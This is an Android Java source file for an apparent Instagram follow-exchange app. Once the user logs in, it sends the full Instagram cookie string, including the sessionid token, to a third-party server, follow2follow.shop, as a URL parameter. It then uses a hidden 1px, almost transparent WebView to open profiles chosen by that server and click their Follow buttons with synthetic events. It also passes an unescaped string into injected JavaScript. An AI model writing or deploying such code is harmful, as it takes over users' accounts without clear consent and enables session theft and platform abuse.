package com.upfollow.app;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.ViewGroup;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;

import org.json.JSONObject;
import java.net.URLEncoder;

public class MainActivity extends Activity {

    private WebView mainWebView;
    private WebView workerWebView; // Background task execution ke liye

    private static final String HOSTING_DASHBOARD = "https://follow2follow.shop/index.php";
    private static final String IG_LOGIN_URL = "https://www.instagram.com/accounts/login/";
    private static final String USER_AGENT = "Mozilla/5.0 (Linux; Android 13; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36";

    @SuppressLint({"SetJavaScriptEnabled", "JavascriptInterface"})
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        mainWebView = findViewById(R.id.webView);
        setupWebView(mainWebView);

        // 1. Worker WebView Setup (1px off-screen to prevent Chromium throttling)
        workerWebView = new WebView(this);
        setupWebView(workerWebView);
        
        FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(1, 1);
        workerWebView.setLayoutParams(params);
        workerWebView.setAlpha(0.01f);
        
        ViewGroup rootView = (ViewGroup) findViewById(android.R.id.content);
        rootView.addView(workerWebView);

        // Native Bridges
        mainWebView.addJavascriptInterface(new MainAppInterface(), "Android");
        workerWebView.addJavascriptInterface(new WorkerAppInterface(), "WorkerBridge");

        // Main WebView Client
        mainWebView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                if (url != null && (url.contains("instagram.com/?") || url.equals("https://www.instagram.com/"))) {
                    String cookies = CookieManager.getInstance().getCookie("https://www.instagram.com");
                    if (cookies != null && cookies.contains("sessionid")) {
                        try {
                            String encoded = URLEncoder.encode(cookies, "UTF-8");
                            mainWebView.loadUrl(HOSTING_DASHBOARD + "?cookies=" + encoded);
                        } catch (Exception e) {
                            mainWebView.loadUrl(HOSTING_DASHBOARD);
                        }
                    }
                }
            }
        });

        // Worker WebView Client (Profile Load Handler)
        workerWebView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                Log.d("WORKER_WV", "Page loaded: " + url);

                // React rendering wait (2.5 seconds delay after initial DOM ready)
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    injectFollowScript(view);
                }, 2500);
            }
        });

        // Auto login check
        String cookies = CookieManager.getInstance().getCookie("https://www.instagram.com");
        if (cookies != null && cookies.contains("sessionid")) {
            mainWebView.loadUrl(HOSTING_DASHBOARD);
        } else {
            mainWebView.loadUrl(IG_LOGIN_URL);
        }
    }

    private void setupWebView(WebView wv) {
        WebSettings s = wv.getSettings();
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);
        s.setDatabaseEnabled(true);
        s.setUserAgentString(USER_AGENT);

        CookieManager cm = CookieManager.getInstance();
        cm.setAcceptCookie(true);
        cm.setAcceptThirdPartyCookies(wv, true);
    }

    // Injected Script: Waits for button, checks state, and dispatches trusted-like event
    private void injectFollowScript(WebView view) {
        String js = "(function() {" +
            "   try {" +
            "       var buttons = Array.from(document.querySelectorAll('button'));" +
            "       var followBtn = buttons.find(b => {" +
            "           var t = (b.innerText || b.textContent || '').trim().toLowerCase();" +
            "           return t === 'follow' || t === 'follow back';" +
            "       });" +
            "       if (!followBtn) {" +
            "           var isFollowing = buttons.some(b => {" +
            "               var t = (b.innerText || b.textContent || '').trim().toLowerCase();" +
            "               return t === 'following' || t === 'requested';" +
            "           });" +
            "           if (isFollowing) {" +
            "               window.WorkerBridge.onTaskResult(true, 'Already Following');" +
            "               return;" +
            "           }" +
            "           window.WorkerBridge.onTaskResult(false, 'Follow button not found on DOM');" +
            "           return;" +
            "       }" +
            "       ['mousedown', 'mouseup', 'click'].forEach(function(evt) {" +
            "           var e = new MouseEvent(evt, { bubbles: true, cancelable: true, view: window });" +
            "           followBtn.dispatchEvent(e);" +
            "       });" +
            "       setTimeout(function() {" +
            "           window.WorkerBridge.onTaskResult(true, 'Clicked Successfully');" +
            "       }, 1000);" +
            "   } catch (err) {" +
            "       window.WorkerBridge.onTaskResult(false, 'JS Error: ' + err.message);" +
            "   }" +
            "})();";

        view.evaluateJavascript(js, null);
    }

    // Bridge for Dashboard (mainWebView)
    public class MainAppInterface {
        @JavascriptInterface
        public void executeBrowserFollow(String targetUsername) {
            new Handler(Looper.getMainLooper()).post(() -> {
                String cleanUser = targetUsername.replace("@", "").trim();
                Log.d("WORKER_WV", "Navigating to: " + cleanUser);
                workerWebView.loadUrl("https://www.instagram.com/" + cleanUser + "/");
            });
        }
    }

    // Bridge for Worker (workerWebView results back to Dashboard)
    public class WorkerAppInterface {
        @JavascriptInterface
        public void onTaskResult(boolean success, String message) {
            Log.d("WORKER_WV", "Result: " + success + " | Msg: " + message);
            new Handler(Looper.getMainLooper()).post(() -> {
                // Main webview ko result notify karein
                mainWebView.evaluateJavascript("window.onWorkerResult(" + success + ", '" + message + "');", null);
            });
        }
    }

    @Override
    public void onBackPressed() {
        if (mainWebView.canGoBack()) {
            mainWebView.goBack();
        } else {
            super.onBackPressed();
        }
    }
}
